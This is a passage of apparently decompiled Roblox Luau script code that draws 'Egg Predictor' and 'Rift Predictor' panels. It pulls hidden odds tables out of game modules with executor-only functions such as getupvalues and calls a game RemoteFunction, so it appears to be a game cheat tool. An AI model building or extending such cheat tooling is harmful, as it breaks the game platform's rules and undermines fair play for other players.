		local function fn41(arg, arg2)
			n38 += 1
			local v18 = fn32(n38)
			v18.Set({ Visible = true, Text = arg })
			table.insert(tbl34, { Kind = "text", Handle = v18, Gap = arg2 })
		end

		local n39

		if not v17 then
			fn37(nil)
			fn41(bold2(paint2(color3.Hint, "Egg data is not available yet")), false)
			n39 = 0
		else
			fn21(v17)
			local v18, v19 = fn34(v17)
			fn41(v18, false)
			local v20 = nil

			if id ~= nil then
				v20 = nil

				for _, v21 in ipairs(v17) do
					if v21.Id == id then
						v20 = v21
						break
					else
						v20 = nil
					end
				end
			end

			fn37(v20 or v19)
			local v21 = string.lower(v15:Query())
			local tbl35 = {}

			for _, v22 in ipairs(v17) do
				if fn35(v22, v21) then
					table.insert(tbl35, v22)
				end
			end

			if #tbl35 == 0 then
				fn41(paint2(color3.Hint, #v17 == 0 and "No eggs yet" or string.format("No results for \"%s\"", tbl10.Escape(v21))), false)
				n39 = 0
			else
				n39 = 0

				for _, v22 in ipairs(tbl29) do
					local tbl36 = {}

					for _, v23 in ipairs(tbl35) do
						if v23.Status == v22.Key then
							table.insert(tbl36, v23)
						end
					end

					if #tbl36 > 0 then
						local flag5 = #tbl34 > 0
						fn41(string.format("<b><font color=\"%s\">%s</font></b> <font color=\"#AAAAAA\">(%d)</font>", v22.Color, v22.Title, #tbl36), flag5)

						for _, v23 in ipairs(tbl36) do
							n39 += 1
							local v24 = fn33(n39)
							fn38(v24, v23)
							table.insert(tbl34, { Kind = "item", Item = v24, HasStatus = true })
						end
					end
				end
			end
		end

		for i = n38 + 1, #tbl33 do
			tbl33[i].Set({ Visible = false })
		end

		for i = n39 + 1, #tbl32 do
			tbl32[i].Frame.Set({ Visible = false })
		end

		fn39()
		n25 = 2
	end

	tbl10.RequestEggRefresh = requestEggRefresh

	if not tbl10.Ready then
		v14:CreateText({ Name = "Egg Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		v14:CreateDropdown({
			Name = "Sort By",
			Options = tbl28,
			Default = tbl28[1],
			Callback = function(sort)
				if table.find(tbl28, sort) then
					tbl30.Sort = sort
					requestEggRefresh()
				end
			end,
		})

		v14:CreateToggle({
			Name = "Preview Card",
			Default = true,
			Callback = function(arg)
				tbl30.Spotlight = arg == true
				requestEggRefresh()
			end,
		})

		local v17 = v14:CreateCanvas({
			Name = "Egg Predictor",
			Search = true,
			SearchPlaceholder = "Search eggs...",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 32,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(arg)
				fn31(arg)
				requestEggRefresh()
			end,
		})

		fn4(function()
			v17:Destroy()
		end)

		local connection = RunService.Heartbeat:Connect(function(deltaTime)
			local v18 = tbl10.PageVisible()
			local flag5

			if v18 then
				flag5 = v15 == nil or tbl10.IsShown(v15:Root())
			else
				flag5 = v18
			end

			if flag5 and not flag4 then
				flag3 = true
			end

			flag4 = flag5
			if not v18 then
				return
			end
			n26 += deltaTime

			if flag5 and flag3 or n26 >= n15 then
				n26 = 0

				if flag5 then
					flag3 = false
					pcall(fn40)
				end

				if tbl10.RefreshFuse then
					pcall(tbl10.RefreshFuse)
				end
			end

			if flag5 and (n25 > 0 or flag2) then
				if n25 > 0 then
					n25 -= 1
				end

				pcall(fn39)
			end

			if tbl10.PlaceFuse then
				tbl10.PlaceFuse()
			end
		end)

		fn4(function()
			connection:Disconnect()
		end)
	end

	paint = tbl10.Paint
	bold = tbl10.Bold
	color = tbl10.Color
	local n38 = 5
	local n39 = n38 + 0.8
	local n40 = 1.2
	local n41 = 1.2
	local n42 = 0.936
	local n43 = 2.3
	local n44 = 0.25
	local n45 = 0.18
	local n46 = n43 + 0.6
	local n47 = 0.24
	n4 = 0.22
	local n48 = 0.0909
	v12 = nil
	tbl11 = {}
	tbl12 = {}
	tbl13 = {}
	tbl14 = {}
	local n49 = 0
	local n50 = 0
	local n51 = 0.06
	local n52 = -1
	local n53 = -1
	local n54 = -1
	local n55 = 4
	local n56 = 3
	flag = false
	n5 = 0

	fn7 = function(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl10.SecretGradient
		end
		return arg.Gradient
	end

	fn8 = function(arg)
		return fn7(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
	end

	fn9 = function(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl10.SecretRotation
		end
		return nil
	end

	fn10 = function(arg)
		v12 = arg
		arg:SetDock(5, { Gap = n4, DividerColor = Color3.fromRGB(170, 174, 184) })
		local v17 = arg:Dock()

		tbl11.Icon = arg:Image({
			Parent = v17,
			X = 0,
			Y = 0,
			Width = n38,
			Height = n38,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n48,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl11.Name = arg:Text({
			Parent = v17,
			X = n39,
			Y = 0,
			Height = n40,
			Scale = n41,
			Wrap = false,
			Gradient = tbl10.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl11.Rarity = arg:Text({
			Parent = v17,
			X = n39,
			Y = 0,
			Height = n40,
			Scale = n42,
			Wrap = false,
			Font = tbl10.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl11.Info = arg:Text({ Parent = v17, X = n39, Y = n40, Height = n38 - n40, Wrap = false, ZIndex = 9 })

		arg:OnResize(function(arg2, arg3, arg4)
			if arg3 == n52 and arg4 == n53 then
				return
			end
			n52 = arg3
			n53 = arg4
			n49 = arg3 / math.max(arg4, 1)
			n50 = arg4
			n5 = 2
			n51 = 0.9 / math.max(arg:TextSize(), 1)
			tbl11.Rarity.Set({ StrokeThickness = n51 })

			for _, v18 in ipairs(tbl12) do
				v18.Rarity.Set({ StrokeThickness = n51 })
			end
		end)
	end

	local function fn41(arg)
		local v17 = arg and arg.Get()
		if not v17 or n50 <= 0 then
			return nil
		end

		if v17.Text ~= tostring(arg.Spec.Text or "") then
			return nil
		end
		return v17
	end

	local function fn42(arg)
		local v17 = fn41(arg)
		if not v17 then
			return nil
		end
		local size = v17.Size
		local textWrapped = v17.TextWrapped
		v17.TextWrapped = false
		v17.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = v17.TextBounds.X
		v17.Size = size
		v17.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		return x / n50
	end

	local function fn43(arg, arg2)
		local v17 = fn41(arg)
		if not v17 then
			return nil
		end
		local size = v17.Size
		v17.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n50 + 0.5)), 100000)
		local y = v17.TextBounds.Y
		v17.Size = size
		if y <= 0 then
			return nil
		end
		return y / n50
	end

	fn11 = function(arg)
		local v17 = tbl13[arg]

		if not v17 then
			local v18 = v12:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl13[arg] = v18
			v17 = v18
		end

		return v17
	end

	fn12 = function(arg)
		local v17 = tbl12[arg]
		if v17 then
			return v17
		end

		local tbl35 = {
			Frame = v12:Frame({
				Name = "Slot",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
			}),
		}

		tbl35.Icon = v12:Image({
			Parent = tbl35.Frame,
			X = n44,
			Y = 0,
			Width = n43,
			Height = n43,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n48,
			StrokeTransparency = 0,
		})

		tbl35.Name = v12:Text({
			Parent = tbl35.Frame,
			X = n44 + n46,
			Y = 0,
			Width = 1,
			Height = n40,
			Scale = n41,
			Wrap = false,
			Gradient = tbl10.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl35.Rarity = v12:Text({
			Parent = tbl35.Frame,
			X = n44 + n46,
			Y = 0,
			Width = 1,
			Height = n40,
			Scale = n42,
			Wrap = false,
			Font = tbl10.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n51,
		})

		tbl35.Detail = v12:Text({
			Parent = tbl35.Frame,
			X = n44 + n46,
			Y = n40,
			Width = math.max(1, n49 - n46 - n44 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl35.Status = v12:Text({
			Parent = tbl35.Frame,
			X = 0,
			Y = 0,
			Width = 1,
			Height = n40,
			Wrap = false,
			Align = "Right",
			Color = color.Hint,
		})

		tbl12[arg] = tbl35
		return tbl35
	end

	fn13 = function()
		if n49 <= 0 then
			return
		end
		flag = false
		local n57 = math.max(1, n49 - n39)
		local v17 = fn42(tbl11.Rarity)

		if v17 then
			n56 = v17 + 0.1
		else
			flag = true
		end

		local v18 = fn42(tbl11.Name)

		if v18 then
			n55 = math.min(v18 + 0.1, math.max(1, n57 - n56 - n47))
		else
			flag = true
		end

		tbl11.Name.Set({ X = n39, Y = 0, Width = n55, Height = n40 })

		tbl11.Rarity.Set({
			X = n39 + n55 + n47,
			Y = 0,
			Width = math.max(0.5, math.min(n56, n57 - n55 - n47)),
			Height = n40,
		})

		tbl11.Info.Set({ X = n39, Y = n40, Width = n57, Height = math.max(1, n38 - n40) })
		local n58 = math.max(1, n49 - n46 - n44 * 2)
		local n59 = 0

		for _, v19 in ipairs(tbl14) do
			if v19.Kind == "text" then
				local handle = v19.Handle
				local v20 = fn43(handle, n49)

				if v20 then
					v19.Height = v20
				else
					flag = true
				end

				local n60 = math.max(1, v19.Height or 1)
				handle.Set({ X = 0, Y = n59 + (v19.Gap and 0.5 or 0), Width = n49, Height = n60 })
				n59 += n60 + n4 * 0.5 + (v19.Gap and 0.5 or 0)
			else
				local slot = v19.Slot
				local v20 = fn43(slot.Detail, n58)

				if v20 then
					slot.DetailUnits = v20
				else
					flag = true
				end

				local n60 = math.clamp(slot.DetailUnits or 1, 1, 4)
				local v21 = fn42(slot.Status)

				if v21 then
					slot.StatusUnits = v21 + 0.23
				else
					flag = true
				end

				local n61 = math.min(n58 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
				local n62 = math.max(1, n58 - n61 - n47)
				local v22 = fn42(slot.Rarity)

				if v22 then
					slot.RarityUnits = v22 + 0.1
				else
					flag = true
				end

				local n63 = math.min(slot.RarityUnits or 3, n62 * 0.5)
				local v23 = fn42(slot.Name)

				if v23 then
					slot.NameUnits = v23 + 0.1
				else
					flag = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = slot.NameUnits or 4
				local max2 = math.max
				local n64 = n62 - n63 - n47
				local v24 = min(max(1, nameUnits), max2(1, n64))
				local n65 = n45 * 2
				local n66 = math.max(n60 + n40, 2.3) + n65
				local n67 = (n66 - n60 - n40) / 2
				slot.Frame.Set({ X = 0, Y = n59, Width = n49, Height = n66 })
				slot.Icon.Set({ Y = (n66 - n43) / 2 })
				slot.Name.Set({ X = n44 + n46, Y = n67, Width = v24 })
				slot.Rarity.Set({ X = n44 + n46 + v24 + n47, Y = n67, Width = math.max(0.5, n63) })
				slot.Detail.Set({ X = n44 + n46, Y = n67 + n40, Width = n58, Height = n60 })
				slot.Status.Set({ X = n44 + n46 + n58 - n61, Y = n67, Width = math.max(0.5, n61) })
				n59 += n66 + n4
			end
		end

		local n60 = math.max(1, n59)

		if math.abs(n60 - n54) > 0.01 then
			n54 = n60
			v12:SetContentLines(n60)
		end
	end
end

do
	local v13 = fn2(function()
		return ReplicatedStorage.Data.Rift
	end)

	local n6 = 30
	local tbl15 = { Verdant = "#6BFFB0", Umbral = "#C08BFF", Radiant = "#FFD34D" }
	local v14 = nil
	local flag2 = false
	local n7 = 0
	local tbl16 = { Banner = {}, Odds = {}, Chance = {}, Clears = 0 }

	local function fn14(arg)
		return tbl15[tostring(arg)] or color.Text
	end

	local function fn15(arg, ...)
		if type(v13) ~= "table" or type(v13[arg]) ~= "function" then
			return nil
		end
		local ok, result = pcall(v13[arg], ...)
		if ok then
			return result
		end
		return nil
	end

	local function fn16(arg)
		return tostring(fn15("GetBannerDisplayName", arg) or arg)
	end

	local function fn17(arg)
		local BannerIdForPeriod = tbl16.Banner[arg]

		if BannerIdForPeriod == nil then
			BannerIdForPeriod = fn15("BannerIdForPeriod", arg) or false
			tbl16.Banner[arg] = BannerIdForPeriod
		end

		return BannerIdForPeriod or nil
	end

	local function fn18(arg)
		local v15, v16, v17 = ipairs(type(v13) == "table" and v13.Banners or {})
		local n8 = 0
		local n9 = 0

		for _, v18 in v15, v16, v17 do
			local n10 = tonumber(fn15("GetBannerWeight", v18.Id)) or 0
			n8 += n10

			if v18.Id == arg then
				n9 = n10
			end
		end

		return n8 > 0 and n9 / n8 * 100 or 0
	end

	local function fn19(arg)
		local v15 = tbl16.Chance[arg]

		if v15 == nil then
			v15 = fn18(arg)
			tbl16.Chance[arg] = v15
		end

		return v15
	end

	local function fn20(arg)
		local GetBanner = fn15("GetBanner", arg)
		local tbl17 = {}
		local v15 = ipairs
		local pets = type(GetBanner) == "table" and GetBanner.Pets or {}
		local n8 = 0

		for _, pet in v15(pets) do
			local n9 = tonumber(fn15("GetPetWeight", arg, pet.AssetId)) or 0

			if n9 > 0 then
				n8 += n9
				table.insert(tbl17, { AssetId = pet.AssetId, Weight = n9 })
			end
		end

		for _, v16 in ipairs(tbl17) do
			v16.Chance = n8 > 0 and v16.Weight / n8 * 100 or 0
		end

		table.sort(tbl17, function(arg2, arg3)
			return arg2.Chance > arg3.Chance
		end)

		return tbl17
	end

	local function fn21(arg)
		local v15 = tbl16.Odds[arg]

		if v15 == nil then
			v15 = fn20(arg)
			tbl16.Odds[arg] = v15
		end

		return v15
	end

	local function fn22(arg)
		local ok, result = pcall(os.date, "%I:%M %p", math.floor(arg))
		if not ok then
			return ""
		end
		return (string.gsub(tostring(result), "^0", ""))
	end

	local function fn23(arg)
		local n8 = math.max(0, math.floor(arg))
		local n9 = math.floor(n8 / 86400)
		local n10 = math.floor(n8 % 86400 / 3600)
		local n11 = math.floor(n8 % 3600 / 60)
		if n9 > 0 then
			return string.format("%dd %dh %02dm", n9, n10, n11)
		end
		return string.format("%dh %02dm", n10, n11)
	end

	local function fn24(arg)
		local income = arg >= 10 and color.Income or arg >= 1 and color.Clock or "#FF7A7A"
		local str = string.format(arg >= 1 and "%.1f%%" or "%.2f%%", arg)
		return bold(paint(income, str))
	end

	local function fn25(arg)
		if arg <= 0 then
			return ""
		end
		local n8 = 100 / arg
		return paint(color.Hint, n8 < 10 and string.format("1 in %.1f", n8) or string.format("1 in %d", math.floor(n8 + 0.5)))
	end

	local function fn26()
		if flag2 or os.clock() < n7 then
			return
		end
		flag2 = true
		n7 = os.clock() + n6

		task.spawn(function()
			local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")

			if rfRiftAskState and rfRiftAskState:IsA("RemoteFunction") then
				local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)

				if ok and type(result) == "table" then
					v14 = result
				end
			end

			flag2 = false
		end)
	end

	local function fn27(arg, arg2, arg3)
		local flag3 = arg ~= nil
		v12:SetDock(flag3 and 5 or 0, { Gap = n4 })
		tbl11.Icon.Set({ Visible = flag3 })
		tbl11.Name.Set({ Visible = flag3 })
		tbl11.Rarity.Set({ Visible = flag3 })
		tbl11.Info.Set({ Visible = flag3 })
		if not flag3 then
			return
		end
		local v15 = fn14(arg)
		local GetBannerEggIcon = fn15("GetBannerEggIcon", arg)

		tbl11.Icon.Set({
			Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
			Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
			StrokeColor = Color3.fromHex(v15),
		})

		tbl11.Name.Set({ Text = tbl10.Escape(fn16(arg)) })
		tbl11.Rarity.Set({ Text = "ACTIVE", Color = Color3.fromHex(color.Ready), Gradient = nil })
		local n8 = arg3 - arg2 % arg3
		local tbl17 = {}
		local str = bold(paint(color.Clock, "Ends in " .. tbl10.FormatClock(n8))) .. tbl10.Separator() .. paint(color.Text, fn22(arg2 + n8))
		local str2 = paint(color.Hint, "Banner chance ") .. fn24(fn19(arg))
		tbl17[1] = str
		tbl17[2] = str2
		local v16 = v14

		if type(v16) == "table" and v16.BannerId == arg then
			if v16.Unlocked == false then
				table.insert(tbl17, paint("#FF7A7A", "Locked on this account"))
			else
				table.insert(tbl17, paint(color.Hint, "Pity ") .. bold(paint(color.Text, string.format("%s/%s", tostring(v16.PityCount or 0), tostring(v16.PityThreshold or 0)))) .. tbl10.Separator() .. paint(color.Hint, "Free rerolls ") .. bold(paint(color.Text, tostring(v16.FreeRefreshesRemaining or 0))))
			end
		end

		tbl11.Info.Set({ Text = table.concat(tbl17, "\n") })
	end

	local function fn28()
		if not v12 then
			return
		end
		n5 = 2
		table.clear(tbl14)
		local n8 = 0
		local n9 = 0

		local function fn29(arg, arg2)
			n8 += 1
			local v15 = fn11(n8)
			v15.Set({ Visible = true, Text = arg })
			table.insert(tbl14, { Kind = "text", Handle = v15, Gap = arg2 })
		end

		local function fn30(arg, arg2)
			local flag3 = #tbl14 > 0
			fn29(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
		end

		local function fn31()
			n9 += 1
			local v15 = fn12(n9)
			v15.Frame.Set({ Visible = true })
			table.insert(tbl14, { Kind = "slot", Slot = v15 })
			return v15
		end

		local serverTimeNow = workspace:GetServerTimeNow()
		local n10 = tonumber(fn15("RotationSeconds")) or 10800
		local n11 = math.floor(serverTimeNow / n10)

		if tbl16.Clears <= os.clock() then
			tbl16.Clears = os.clock() + 60
			table.clear(tbl16.Banner)
			table.clear(tbl16.Odds)
			table.clear(tbl16.Chance)
		end

		local v15 = fn17(n11)

		if type(v13) ~= "table" or v15 == nil then
			fn27(nil)
			fn29(bold(paint(color.Hint, "Rift data is not available yet")), false)
		else
			fn27(v15, serverTimeNow, n10)
			local v16 = v14

			if type(v16) == "table" and v16.BannerId == v15 and type(v16.Requirements) == "table" and #v16.Requirements > 0 then
				fn30("CURRENT RECIPE", color.Text)
				local tbl17 = {}

				for _, requirement in ipairs(v16.Requirements) do
					local v17 = tbl10.AssetInfo(requirement)
					local insert = table.insert
					local v18 = table.pack(bold(paint(v17.Hex, tbl10.Escape(v17.Name))))
					insert(tbl17, table.unpack(v18, 1, v18.n))
				end

				fn29(table.concat(tbl17, tbl10.Separator()), false)
			end

			fn30("REWARD ODDS" .. tbl10.Separator() .. string.upper(fn16(v15)), fn14(v15))
			local v17 = fn21(v15)

			for i, v18 in ipairs(v17) do
				local v19 = tbl10.AssetInfo(v18.AssetId)
				local v20 = fn31()
				v20.Icon.Set({ Visible = v19.Icon ~= nil, Image = v19.Icon or "", StrokeColor = v19.Color })
				v20.Name.Set({ Text = tbl10.Escape(v19.Name) })

				v20.Rarity.Set({
					Text = string.upper(tostring(v19.Rarity)),
					Color = fn8(v19),
					Gradient = fn7(v19),
					GradientRotation = fn9(v19),
				})

				v20.Status.Set({ Text = fn24(v18.Chance) })
				local v21 = fn25(v18.Chance)

				if i == #v17 then
					v21 ..= tbl10.Separator() .. bold(paint(color.Clock, "Chase pet"))
				end

				v20.Detail.Set({ Text = v21 })
			end

			fn30("UPCOMING RIFTS", color.Text)

			for i = 1, 6 do
				local v18 = fn17(n11 + i)
				local n12 = (n11 + i) * n10
				local v19 = fn31()
				local GetBannerEggIcon = fn15("GetBannerEggIcon", v18)
				local v20 = fn14(v18)

				v19.Icon.Set({
					Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
					Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
					StrokeColor = Color3.fromHex(v20),
				})

				v19.Name.Set({ Text = tbl10.Escape(fn16(v18)) })
				v19.Rarity.Set({ Text = i == 1 and "NEXT" or "#" .. i, Color = Color3.fromHex(v20), Gradient = nil })
				v19.Status.Set({ Text = bold(paint(color.Clock, "in " .. fn23(n12 - serverTimeNow))) })
				local v21 = fn21(v18)
				local v22 = v21[#v21]
				local str = paint(color.Hint, "Starts ") .. paint(color.Text, fn22(n12))

				if v22 then
					local v23 = tbl10.AssetInfo(v22.AssetId)
					str ..= tbl10.Separator() .. paint(color.Hint, "Chase ") .. bold(paint(v23.Hex, tbl10.Escape(v23.Name))) .. " " .. fn24(v22.Chance)
				end

				v19.Detail.Set({ Text = str })
			end

			fn30("NEXT TIME EACH RIFT OPENS", color.Text)
			local v18 = ipairs
			local banners = v13.Banners or {}

			for _, banner in v18(banners) do
				local v19 = fn14(banner.Id)
				local v20 = table.pack(tbl10.Escape(fn16(banner.Id)))
				local v21 = paint
				v20.n = 2 + v20.n - 1
				table.move(v20, 1, v20.n, 2, v20)
				v20[1] = v19
				local v22 = bold(v21(table.unpack(v20, 1, v20.n)))
				local str

				if banner.Id == v15 then
					str = v22 .. tbl10.Separator() .. bold(paint(color.Ready, "Open now"))
				else
					local v23 = nil

					for i = 1, 2000 do
						local id = banner.Id

						if fn17(n11 + i) == id then
							v23 = i
							break
						else
							v23 = nil
						end
					end

					if v23 then
						local n12 = (n11 + v23) * n10
						str = v22 .. tbl10.Separator() .. bold(paint(color.Clock, "in " .. fn23(n12 - serverTimeNow))) .. tbl10.Separator() .. paint(color.Text, fn22(n12))
					else
						str = v22 .. tbl10.Separator() .. paint(color.Hint, "Not soon")
					end
				end

				fn29(str .. tbl10.Separator() .. paint(color.Hint, "chance ") .. fn24(fn19(banner.Id)), false)
			end
		end

		for i = n8 + 1, #tbl13 do
			tbl13[i].Set({ Visible = false })
		end

		for i = n9 + 1, #tbl12 do
			tbl12[i].Frame.Set({ Visible = false })
		end

		fn13()
		n5 = 2
	end

	if not tbl10.Ready then
		v10:CreateText({ Name = "Rift Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		local v15 = v10:CreateCanvas({
			Name = "Rift Predictor",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 34,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(arg)
				fn10(arg)
				pcall(fn28)
			end,
		})

		fn4(function()
			v15:Destroy()
		end)

		local n8 = 1

		local connection = RunService.Heartbeat:Connect(function(deltaTime)
			if not v12 or not tbl10.PageVisible() or not tbl10.IsShown(v12:Root()) then
				return
			end
			fn26()
			n8 += deltaTime

			if n8 >= 1 then
				n8 = 0
				pcall(fn28)
			end

			if n5 > 0 or flag then
				if n5 > 0 then
					n5 -= 1
				end

				pcall(fn13)
			end
		end)

		fn4(function()
			connection:Disconnect()
		end)
	end
end

local paint2, bold2, color2, n6, n7, n8, n9, n10, n11, n12

do
	local tbl15 = {
		{ min = 0.85, max = 1.05, weight = 2000 },
		{ min = 1.45, max = 1.55, weight = 250 },
		{ min = 1.9, max = 2.1, weight = 125 },
		{ min = 2.85, max = 3.15, weight = 62.5 },
		{ min = 3.8, max = 4.2, weight = 31.25 },
		{ min = 0.3, max = 0.45, weight = 18 },
		{ min = 0.1, max = 0.2, weight = 5 },
		{ min = 5.8, max = 6.2, weight = 15.625 },
		{ min = 9.5, max = 12.5, weight = 3 },
		{ min = 12, max = 17, weight = 0.05 },
		{ min = 20, max = 35, weight = 0.0001 },
	}

	paint2 = tbl10.Paint
	bold2 = tbl10.Bold
	color2 = tbl10.Color
	n6 = 5
	n7 = n6 + 0.8
	n8 = 1.2
	n9 = 1.2
	n10 = 0.936
	n11 = 2.3
	n12 = 0.25
	local n13 = 0.18
	local n14 = n11 + 0.6
	local n15 = 0.24
	local n16 = 0.22
	local n17 = 0.0909
	local v13 = nil
	local tbl16 = {}
	local tbl17 = {}
	local tbl18 = {}
	local tbl19 = {}
	local n18 = 0
	local n19 = 0
	local n20 = 0.06
	local n21 = -1
	local n22 = -1
	local n23 = -1
	local n24 = 4
	local n25 = 3
	local flag2 = false
	local n26 = 0
	local v14 = nil

	local tbl20 = {
		{ Min = 0, Color = "#8F98A8" },
		{ Min = 0.3, Color = "#C6CDDA" },
		{ Min = 0.85, Color = "#FFFFFF" },
		{ Min = 1.45, Color = "#7CFF9E" },
		{ Min = 1.9, Color = "#4FE0FF" },
		{ Min = 2.85, Color = "#6FA0FF" },
		{ Min = 3.8, Color = "#C08BFF" },
		{ Min = 5.8, Color = "#FF9A3D" },
		{ Min = 9.5, Color = "#FF5C5C" },
		{ Min = 12, Color = "#FFD34D" },
		{ Min = 20, Color = "#FF4DE8" },
	}

	local function fn14(arg)
		local n27 = -math.huge
		local str = "#FFFFFF"

		for _, v15 in ipairs(tbl20) do
			if arg + 0.001 >= v15.Min and v15.Min > n27 then
				str = v15.Color
				n27 = v15.Min
			end
		end

		return str
	end

	local function fn15(arg, arg2)
		local eggRecords = tbl.EggRecords
		if type(eggRecords) ~= "table" or type(eggRecords.WeightKgForScale) ~= "function" then
			return nil
		end
		local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
		if ok and type(result) == "number" and result > 0 then
			return result
		end
		return nil
	end

	local function fn16(arg)
		if type(arg) ~= "table" or #arg == 0 then
			return nil
		end
		local n27 = -math.huge
		local v15 = nil

		for _, v16 in ipairs(arg) do
			local v17 = tbl10.MutationMultiplier({ v16 })

			if n27 < v17 then
				n27 = v17
				v15 = v16
			end
		end

		return v15
	end

	local function fn17()
		if v14 then
			return v14
		end
		local eggRecords = tbl.EggRecords
		local getupvalues_ = type(debug) == "table" and debug.getupvalues or getupvalues

		if type(eggRecords) == "table" and type(eggRecords.DrawAssetScale) == "function" and type(getupvalues_) == "function" then
			local ok, result = pcall(getupvalues_, eggRecords.DrawAssetScale)

			if ok and type(result) == "table" then
				for _, v15 in pairs(result) do
					if type(v15) == "table" and type(v15[1]) == "table" and v15[1].min and v15[1].weight then
						v14 = v15
						break
					end
				end
			end
		end

		v14 = v14 or tbl15
		return v14
	end

	local function fn18(arg, arg2, arg3)
		local fuseKernel = tbl.FuseKernel

		if type(fuseKernel) == "table" and type(fuseKernel.BandWeightBias) == "function" then
			local ok, result = pcall(fuseKernel.BandWeightBias, arg, arg2, arg3)
			if ok and type(result) == "number" then
				return result
			end
		end

		return math.exp(math.log((arg[1] + arg[2] + arg[3]) / 3) / 0.69314718055994529 * math.log((arg2 + arg3) / 2) / 0.69314718055994529 * 0.6)
	end

	local function fn19()
		local save = tbl.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		if not ok or type(result) ~= "table" then
			return nil
		end
		local fusionSlots = type(result.FusionSlots) == "table" and result.FusionSlots or {}
		local inventory = type(result.Inventory) == "table" and result.Inventory or {}
		local tbl21 = {}

		for i = 1, 3 do
			local v15 = fusionSlots[i]
			local flag3 = v15 ~= nil and inventory[v15] or nil

			if type(flag3) == "table" then
				table.insert(tbl21, {
					Category = flag3.Category,
					Scale = tonumber(flag3.Scale) or 1,
					Mutations = type(flag3.Mutations) == "table" and flag3.Mutations or {},
				})
			end
		end

		return {
			Items = tbl21,
			Locked = result.FusionLocked == true,
			Duration = tonumber(result.FusionDuration) or 0,
			Reward = result.FusionEggReward ~= nil and result.FusionEggReward ~= false,
		}
	end

	local function fn20(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl10.SecretGradient
		end
		return arg.Gradient
	end

	local function fn21(arg)
		return fn20(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
	end

	local function fn22(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl10.SecretRotation
		end
		return nil
	end

	local function fn23(arg)
		v13 = arg
		arg:SetDock(5, { Gap = n16, DividerColor = Color3.fromRGB(170, 174, 184) })
		local v15 = arg:Dock()

		tbl16.Icon = arg:Image({
			Parent = v15,
			X = 0,
			Y = 0,
			Width = n6,
			Height = n6,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n17,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl16.Name = arg:Text({
			Parent = v15,
			X = n7,
			Y = 0,
			Height = n8,
			Scale = n9,
			Wrap = false,
			Gradient = tbl10.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl16.Rarity = arg:Text({
			Parent = v15,
			X = n7,
			Y = 0,
			Height = n8,
			Scale = n10,
			Wrap = false,
			Font = tbl10.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl16.Info = arg:Text({ Parent = v15, X = n7, Y = n8, Height = n6 - n8, Wrap = false, ZIndex = 9 })

		arg:OnResize(function(arg2, arg3, arg4)
			if arg3 == n21 and arg4 == n22 then
				return
			end
			n21 = arg3
			n22 = arg4
			n18 = arg3 / math.max(arg4, 1)
			n19 = arg4
			n26 = 2
			n20 = 0.9 / math.max(arg:TextSize(), 1)
			tbl16.Rarity.Set({ StrokeThickness = n20 })

			for _, v16 in ipairs(tbl17) do
				v16.Rarity.Set({ StrokeThickness = n20 })
			end
		end)
	end

	local function fn24(arg)
		local v15 = arg and arg.Get()
		if not v15 or n19 <= 0 then
			return nil
		end

		if v15.Text ~= tostring(arg.Spec.Text or "") then
			return nil
		end
		return v15
	end

	local function fn25(arg)
		local v15 = fn24(arg)
		if not v15 then
			return nil
		end
		local size = v15.Size
		local textWrapped = v15.TextWrapped
		v15.TextWrapped = false
		v15.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = v15.TextBounds.X
		v15.Size = size
		v15.TextWrapped = textWrapped
		if x <= 0 then
